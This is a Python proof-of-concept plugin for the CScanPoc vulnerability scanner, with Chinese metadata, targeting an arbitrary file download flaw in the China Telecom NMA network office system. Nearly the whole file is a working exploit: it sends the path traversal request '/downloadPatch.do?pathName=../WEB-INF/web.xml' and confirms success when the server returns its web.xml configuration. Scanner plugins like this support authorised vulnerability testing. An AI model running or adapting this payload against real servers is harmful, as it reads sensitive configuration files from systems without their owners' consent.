# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '189_0102' # 平台漏洞编号
    name = '中国电信NMA网络办公系统任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2013-01-30'  # 漏洞公布时间
    desc = '''
    中国电信NMA网络办公系统任意文件下载漏洞，攻击者可以通过任意文件下载来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=15984
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '189(电信)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '453f4845-877a-4a0a-a8cb-b1e587e041bf' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/downloadPatch.do?pathName=../WEB-INF/web.xml"
            url = self.target + payload
            response = requests.get(url)
            if "<param-name>" in response.text and "<init-param>" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
